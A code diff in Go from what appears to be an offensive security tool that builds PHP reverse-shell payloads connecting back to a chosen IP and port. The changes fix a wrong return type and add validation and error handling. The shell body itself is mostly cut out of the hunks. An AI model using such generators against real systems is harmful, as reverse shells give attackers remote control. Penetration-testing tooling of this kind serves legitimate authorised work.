@@ -6,9 +6,9 @@ type PHPShellCode struct {
     *ShellCodeBase
 }
 
-func NewPHPShellCode(osTarget, osTargetArch, connectBackIP string, connectBackPort int, badChars []byte, prefix, suffix string) *PyShellCode {
+func NewPHPShellCode(osTarget, osTargetArch, connectBackIP string, connectBackPort int, badChars []byte, prefix, suffix string) *PHPShellCode {
     base := NewShellCodeBase(osTarget, osTargetArch, connectBackIP, connectBackPort, badChars, prefix, suffix)
-    return &PyShellCode{base}
+    return &PHPShellCode{base}
 }
 
 func (psc *PHPShellCode) GetPHPInfo() string {
@@ -16,9 +16,9 @@ func (psc *PHPShellCode) GetPHPInfo() string {
     return phpcode
 }
 
-func (psc *PHPShellCode) GetPHPCode() string {
-    if psc.IP == "" || psc.Port == 0 {
-        return ""
+func (psc *PHPShellCode) GetPHPCode() (string, error) {
+    if err := psc.Validate(); err != nil {
+        return "", err
     }
 
     phpcode := `
@@ -54,15 +54,24 @@ func (psc *PHPShellCode) GetPHPCode() string {
         }
         fclose($sock);
         `
-    phpcode = psc.GenShellCode(phpcode)
-    return fmt.Sprintf("%s%s%s", psc.Prefix, phpcode, psc.Suffix)
+    shellcode, err := psc.GenShellCode(phpcode)
+    if err != nil {
+        return "", fmt.Errorf("generate php shellcode failed: %v", err)
+    }
+
+    return shellcode, nil
 }
 
 func (psc *PHPShellCode) GetShellCode(inline bool) string {
-    phpShell := psc.GetPHPCode()
-    if inline {
-       phpShell = psc.MakeInline(phpShell) 
+    shellcode, err := psc.GetPHPCode()
+    if err != nil {
+        return ""
     }
-    return phpShell
+
+    if inline {
+        shellcode = psc.MakeInline(shellcode)
+    }
+
+    return fmt.Sprintf("%s%s%s", psc.Prefix, shellcode, psc.Suffix)
 }
 
